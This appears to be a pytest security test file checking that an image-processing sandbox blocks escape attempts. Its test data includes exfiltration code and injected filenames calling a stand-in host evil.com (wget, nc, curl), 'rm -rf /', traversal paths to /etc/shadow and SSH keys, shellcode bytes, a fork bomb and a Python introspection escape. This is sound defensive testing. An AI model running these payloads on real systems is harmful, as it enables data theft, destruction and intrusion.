"""
Ultra-realistic sandbox escape attempt tests.
Tests real-world attack vectors and ensures proper isolation.
"""

import asyncio
import os
import socket
import struct
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import psutil
import pytest

from app.core.security.engine import SecurityEngine
from app.core.security.sandbox import SecurityError, SecuritySandbox


class TestSandboxEscapeAttempts:
    """Test sandbox resilience against real escape attempts."""

    @pytest.fixture
    def security_engine(self):
        """Create SecurityEngine instance."""
        return SecurityEngine()

    @pytest.fixture
    def sandbox(self, security_engine):
        """Create a strict sandbox for testing."""
        return security_engine.create_sandbox(
            conversion_id="test-escape-001", strictness="paranoid"  # Maximum security
        )

    @pytest.mark.security
    @pytest.mark.critical
    @pytest.mark.asyncio
    async def test_network_escape_via_socket(self, sandbox):
        """
        Test that sandbox blocks all network socket creation attempts.

        Real attack: Malicious image processing code tries to exfiltrate data.
        """
        # Create malicious payload that attempts network connection
        malicious_code = """
import socket
import urllib.request
import http.client
import ftplib
import smtplib

# Try multiple network methods
attempts = []

# Attempt 1: Raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 80))
    s.send(b"STOLEN_DATA")
    attempts.append("socket_succeeded")
except:
    attempts.append("socket_blocked")

# Attempt 2: urllib
try:
    urllib.request.urlopen("http://evil.com/steal")
    attempts.append("urllib_succeeded")
except:
    attempts.append("urllib_blocked")

# Attempt 3: http.client
try:
    conn = http.client.HTTPConnection("evil.com")
    conn.request("POST", "/data", "stolen_info")
    attempts.append("http_client_succeeded")
except:
    attempts.append("http_client_blocked")

# Attempt 4: FTP
try:
    ftp = ftplib.FTP("evil.com")
    ftp.login("anonymous", "stolen@data.com")
    attempts.append("ftp_succeeded")
except:
    attempts.append("ftp_blocked")

# Attempt 5: SMTP
try:
    smtp = smtplib.SMTP("evil.com", 25)
    smtp.sendmail("from@test.com", "to@evil.com", "Stolen data")
    attempts.append("smtp_succeeded")
except:
    attempts.append("smtp_blocked")

print("ATTEMPTS:", attempts)
"""

        # Write malicious code to temp file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(malicious_code)
            malicious_script = f.name

        try:
            # Attempt to execute in sandbox
            with pytest.raises(SecurityError) as exc_info:
                await sandbox.execute_sandboxed_async(
                    command=[os.sys.executable, malicious_script], timeout=5
                )

            # Verify network access was blocked
            assert (
                "network" in str(exc_info.value).lower()
                or "socket" in str(exc_info.value).lower()
                or "forbidden" in str(exc_info.value).lower()
            )

        finally:
            os.unlink(malicious_script)

        # Verify no actual network connections were made
        connections = psutil.net_connections()
        external_connections = [
            c
            for c in connections
            if c.raddr and c.raddr.ip not in ["127.0.0.1", "::1", "localhost"]
        ]
        assert len(external_connections) == 0, "Network escape detected!"

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_filesystem_escape_via_path_traversal(self, sandbox):
        """
        Test that sandbox blocks filesystem escape via path traversal.

        Real attack: Malicious code tries to read sensitive files.
        """
        sensitive_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "../" * 20 + "etc/hosts",
            "/etc/passwd",  # Absolute path
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",  # Windows
            "~/../../etc/passwd",  # Home directory traversal
        ]

        for path in sensitive_paths:
            # Attempt to validate malicious path
            with pytest.raises(SecurityError) as exc_info:
                sandbox.validate_path(path)

            assert (
                "traversal" in str(exc_info.value).lower()
                or "absolute" in str(exc_info.value).lower()
                or "forbidden" in str(exc_info.value).lower()
            )

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_subprocess_escape_via_shell_injection(self, sandbox):
        """
        Test that sandbox blocks shell injection attempts.

        Real attack: Command injection through image filename or parameters.
        """
        injection_attempts = [
            "image.jpg; cat /etc/passwd",
            "image.jpg && wget evil.com/backdoor.sh",
            "image.jpg | nc evil.com 4444",
            "image.jpg`cat /etc/passwd`",
            "image.jpg$(curl evil.com/steal)",
            "image.jpg'; DROP TABLE images; --",
            'image.jpg"; rm -rf /; "',
        ]

        for malicious_input in injection_attempts:
            # Attempt to use malicious input as filename
            with pytest.raises(SecurityError):
                sandbox.validate_command(["convert", malicious_input, "output.png"])

    @pytest.mark.security
    @pytest.mark.critical
    async def test_memory_escape_via_buffer_overflow(self, sandbox):
        """
        Test that sandbox handles buffer overflow attempts safely.

        Real attack: Crafted image with oversized metadata to cause overflow.
        """
        # Create image with malicious metadata attempting buffer overflow
        overflow_patterns = [
            b"A" * 100000,  # Simple overflow
            b"\x90" * 10000 + b"\xeb\x1f\x5e\x89\x76",  # NOP sled + shellcode start
            struct.pack("<I", 0x41414141) * 10000,  # Address overwrite pattern
            b"\x00" * 50000 + b"\xff" * 50000,  # Null byte injection
        ]

        for pattern in overflow_patterns:
            # Create malicious image data
            malicious_image = b"\xff\xd8\xff\xe0"  # JPEG header
            malicious_image += struct.pack(">H", len(pattern) + 2)  # Size field
            malicious_image += pattern  # Overflow attempt
            malicious_image += b"\xff\xd9"  # JPEG end

            # Sandbox should handle safely without crashing
            try:
                result = await sandbox.execute_sandboxed_async(
                    command=[sys.executable, "-c", "print('test')"],
                    input_data=malicious_image[:1000],  # Limit size for test
                    timeout=2,
                )
                # If it doesn't raise, ensure memory limits worked
                assert result is None or "error" in str(result).lower()
            except SecurityError:
                # Expected - sandbox detected the attack
                pass
            except MemoryError:
                # Also acceptable - memory limit enforced
                pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_escape_via_symlink_attack(self, sandbox):
        """
        Test that sandbox prevents symlink-based escapes.

        Real attack: Creating symlinks to access files outside sandbox.
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)

            # Try to create symlink to sensitive file
            sensitive_file = "/etc/passwd"
            symlink_path = tmpdir_path / "innocent_image.jpg"

            try:
                # Attempt to create symlink
                os.symlink(sensitive_file, symlink_path)

                # Sandbox should reject symlink
                with pytest.raises(SecurityError):
                    sandbox.validate_path(str(symlink_path))

            except OSError:
                # System might prevent symlink creation - that's fine
                pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_escape_via_environment_manipulation(self, sandbox):
        """
        Test that sandbox sanitizes environment variables.

        Real attack: Manipulating PATH, LD_PRELOAD, etc. to load malicious code.
        """
        dangerous_env_vars = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp/evil:/usr/lib",
            "PATH": "/tmp/evil:/usr/bin",
            "PYTHONPATH": "/tmp/evil",
            "PERL5LIB": "/tmp/evil",
            "RUBYLIB": "/tmp/evil",
            "NODE_PATH": "/tmp/evil",
        }

        # Sandbox should sanitize these
        clean_env = sandbox._sanitize_environment(dangerous_env_vars)

        # Verify dangerous vars are removed or sanitized
        assert "LD_PRELOAD" not in clean_env
        assert "LD_LIBRARY_PATH" not in clean_env
        if "PATH" in clean_env:
            assert "/tmp/evil" not in clean_env["PATH"]
        assert (
            "PYTHONPATH" not in clean_env or "/tmp/evil" not in clean_env["PYTHONPATH"]
        )

    @pytest.mark.security
    @pytest.mark.slow
    @pytest.mark.asyncio
    async def test_escape_via_resource_exhaustion(self, sandbox):
        """
        Test that sandbox prevents resource exhaustion attacks.

        Real attack: Fork bomb, memory exhaustion, CPU spinning.
        """
        # Test 1: Fork bomb attempt
        fork_bomb_code = """
import os
while True:
    os.fork()
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(fork_bomb_code)
            fork_bomb_script = f.name

        try:
            # Should be killed by resource limits
            with pytest.raises((SecurityError, OSError, subprocess.TimeoutExpired)):
                await sandbox.execute_sandboxed_async(
                    command=[os.sys.executable, fork_bomb_script], timeout=2
                )
        finally:
            os.unlink(fork_bomb_script)

        # Test 2: Memory exhaustion
        memory_bomb_code = """
data = []
while True:
    data.append("A" * 1024 * 1024)  # Allocate 1MB at a time
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(memory_bomb_code)
            memory_bomb_script = f.name

        try:
            # Should be killed by memory limit
            with pytest.raises((SecurityError, MemoryError, subprocess.TimeoutExpired)):
                await sandbox.execute_sandboxed_async(
                    command=[os.sys.executable, memory_bomb_script], timeout=2
                )
        finally:
            os.unlink(memory_bomb_script)

        # Test 3: CPU spinning
        cpu_spin_code = """
while True:
    pass  # Infinite loop
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(cpu_spin_code)
            cpu_spin_script = f.name

        try:
            # Should be killed by timeout
            with pytest.raises((SecurityError, subprocess.TimeoutExpired)):
                await sandbox.execute_sandboxed_async(
                    command=[os.sys.executable, cpu_spin_script], timeout=1
                )
        finally:
            os.unlink(cpu_spin_script)

    @pytest.mark.security
    async def test_escape_via_signal_manipulation(self, sandbox):
        """
        Test that sandbox prevents signal-based escapes.

        Real attack: Using signals to interfere with sandbox monitoring.
        """
        signal_attack_code = """
import signal
import os

# Try to ignore termination signals
signal.signal(signal.SIGTERM, signal.SIG_IGN)
signal.signal(signal.SIGINT, signal.SIG_IGN)

# Try to kill parent process
try:
    os.kill(os.getppid(), signal.SIGKILL)
except:
    pass

# Try to send signals to init process
try:
    os.kill(1, signal.SIGTERM)
except:
    pass
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(signal_attack_code)
            signal_script = f.name

        try:
            # Should handle signal manipulation safely
            result = await sandbox.execute_sandboxed_async(
                command=[os.sys.executable, signal_script], timeout=2
            )

            # Parent process should still be alive
            assert psutil.Process().is_running()

        except (SecurityError, subprocess.TimeoutExpired):
            # Expected - sandbox detected or prevented the attack
            pass
        finally:
            os.unlink(signal_script)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_escape_via_file_descriptor_leak(self, sandbox):
        """
        Test that sandbox prevents file descriptor leaks.

        Real attack: Inheriting file descriptors to access restricted resources.
        """
        # Open a sensitive file
        with open("/etc/hosts", "r") as sensitive_file:
            sensitive_fd = sensitive_file.fileno()

            fd_leak_code = f"""
import os
try:
    # Try to read from inherited file descriptor
    data = os.read({sensitive_fd}, 1024)
    print("LEAKED:", data)
except:
    print("FD_BLOCKED")
"""

            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(fd_leak_code)
                fd_script = f.name

            try:
                # Sandbox should close inherited file descriptors
                result = await sandbox.execute_sandboxed_async(
                    command=[os.sys.executable, fd_script], timeout=2
                )

                # Should not leak data
                if result and isinstance(result, dict):
                    output = result.get("stdout", b"").decode("utf-8", errors="ignore")
                    assert "LEAKED:" not in output
                    assert "FD_BLOCKED" in output or "Bad file descriptor" in output

            finally:
                os.unlink(fd_script)

    @pytest.mark.security
    @pytest.mark.critical
    @pytest.mark.asyncio
    async def test_escape_via_python_introspection(self, sandbox):
        """
        Test that sandbox prevents Python introspection escapes.

        Real attack: Using Python's introspection to access restricted modules.
        """
        introspection_attack = """
import sys

# Try to access restricted modules via introspection
attempts = []

# Attempt 1: Access via sys.modules
try:
    if 'os' in sys.modules:
        os_module = sys.modules['os']
        os_module.system("echo 'ESCAPED'")
        attempts.append("sys_modules_escaped")
except:
    attempts.append("sys_modules_blocked")

# Attempt 2: Access via __builtins__
try:
    __builtins__.__import__('subprocess').run(['echo', 'ESCAPED'])
    attempts.append("builtins_escaped")
except:
    attempts.append("builtins_blocked")

# Attempt 3: Access via type introspection
try:
    ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('echo ESCAPED')
    attempts.append("type_introspection_escaped")
except:
    attempts.append("type_introspection_blocked")

print("INTROSPECTION_ATTEMPTS:", attempts)
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(introspection_attack)
            introspection_script = f.name

        try:
            # Execute in sandbox
            result = await sandbox.execute_sandboxed_async(
                command=[os.sys.executable, introspection_script], timeout=2
            )

            if result and isinstance(result, dict):
                output = result.get("stdout", b"").decode("utf-8", errors="ignore")

                # Verify no escapes succeeded
                assert "escaped" not in output.lower() or "blocked" in output.lower()

                # Check that attempts were blocked
                if "INTROSPECTION_ATTEMPTS:" in output:
                    assert "blocked" in output
                    assert "escaped" not in output.lower() or "_blocked" in output

        except SecurityError:
            # Expected - sandbox prevented execution
            pass
        finally:
            os.unlink(introspection_script)
